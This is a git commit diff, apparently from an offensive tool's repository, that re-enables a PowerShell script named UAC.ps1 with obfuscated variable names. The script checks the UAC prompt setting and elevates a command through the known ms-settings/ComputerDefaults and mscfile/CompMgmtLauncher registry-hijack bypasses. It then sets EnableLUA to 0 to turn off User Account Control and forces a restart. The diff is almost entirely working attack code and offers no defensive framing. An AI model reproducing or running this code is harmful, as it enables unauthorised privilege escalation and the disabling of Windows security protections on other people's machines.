a30c1afa098dd6b39c5627b40d58a899abdfa0fd
OTE <ali.abbass@lau.edu>
2023-02-18 05:58:41 -0500

    update  UAC

--- resources/UAC.ps1
+++ resources/UAC.ps1
@@ -2,43 +2,43 @@ workflow gXJqIeQLEx{
 	[CmdletBinding()]
 	param([string]$nGZbQUSuHF='cmd.exe')
 
-    # $jZdzyknCRV = [System.Environment]::OSVersion.Version.Major
+    $jZdzyknCRV = [System.Environment]::OSVersion.Version.Major
 
 	
-	# $LSthpEDlPZ = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-	# $gzXVjLfAtC = Get-ItemPropertyValue -Path $LSthpEDlPZ -Name ConsentPromptBehaviorAdmin
+	$LSthpEDlPZ = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+	$gzXVjLfAtC = Get-ItemPropertyValue -Path $LSthpEDlPZ -Name ConsentPromptBehaviorAdmin
 
-	# function snCAvSgLOW([string]$LSthpEDlPZ, [string]$zcmQEOiKZb, [string]$nGZbQUSuHF='cmd.exe'){
-	# 	$nGZbQUSuHF = "HKCU:\Software\Classes\$LSthpEDlPZ\shell\open\command"
-	# 	New-Item $nGZbQUSuHF -Force
-	# 	New-ItemProperty $nGZbQUSuHF -Name "DelegateExecute" -Value $null -Force
-	# 	Set-ItemProperty $nGZbQUSuHF -Name "(default)" -Value $nGZbQUSuHF -Force
-	# 	Start-Process $zcmQEOiKZb
-	# 	Start-Sleep -s 5
-	# 	Remove-Item $nGZbQUSuHF -Force -Recurse
-	# }
+	function snCAvSgLOW([string]$LSthpEDlPZ, [string]$zcmQEOiKZb, [string]$nGZbQUSuHF='cmd.exe'){
+		$nGZbQUSuHF = "HKCU:\Software\Classes\$LSthpEDlPZ\shell\open\command"
+		New-Item $nGZbQUSuHF -Force
+		New-ItemProperty $nGZbQUSuHF -Name "DelegateExecute" -Value $null -Force
+		Set-ItemProperty $nGZbQUSuHF -Name "(default)" -Value $nGZbQUSuHF -Force
+		Start-Process $zcmQEOiKZb
+		Start-Sleep -s 5
+		Remove-Item $nGZbQUSuHF -Force -Recurse
+	}
 
-	# if ($gzXVjLfAtC -eq 2) {
-	# 	$rjCeXGhRVN = 'High'
-	# } elseif ($gzXVjLfAtC -eq 0) {
-	# 	$rjCeXGhRVN = 'None'
-	# } elseif ($gzXVjLfAtC -eq 5) {
-	# 	$rjCeXGhRVN = 'Default'
-	# } else {
-	# 	$rjCeXGhRVN = 'Unknown'
-	# }
+	if ($gzXVjLfAtC -eq 2) {
+		$rjCeXGhRVN = 'High'
+	} elseif ($gzXVjLfAtC -eq 0) {
+		$rjCeXGhRVN = 'None'
+	} elseif ($gzXVjLfAtC -eq 5) {
+		$rjCeXGhRVN = 'Default'
+	} else {
+		$rjCeXGhRVN = 'Unknown'
+	}
 
-	# if ($rjCeXGhRVN -eq "High") {
-	# 	exit
-	# } elseif ($rjCeXGhRVN -eq "None") {
-	# 	Start-Process -FilePath $nGZbQUSuHF -verb runas
-	# } else {
-	# 	if ($jZdzyknCRV -eq 10) {
-	# 		snCAvSgLOW ms-settings ComputerDefaults.exe $nGZbQUSuHF
-	# 	} else {
-	# 		snCAvSgLOW mscfile CompMgmtLauncher.exe $nGZbQUSuHF
-	# 	}
-	# }
+	if ($rjCeXGhRVN -eq "High") {
+		exit
+	} elseif ($rjCeXGhRVN -eq "None") {
+		Start-Process -FilePath $nGZbQUSuHF -verb runas
+	} else {
+		if ($jZdzyknCRV -eq 10) {
+			snCAvSgLOW ms-settings ComputerDefaults.exe $nGZbQUSuHF
+		} else {
+			snCAvSgLOW mscfile CompMgmtLauncher.exe $nGZbQUSuHF
+		}
+	}
 
 	Set-ItemProperty -Path "REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
 	Restart-Computer -Wait
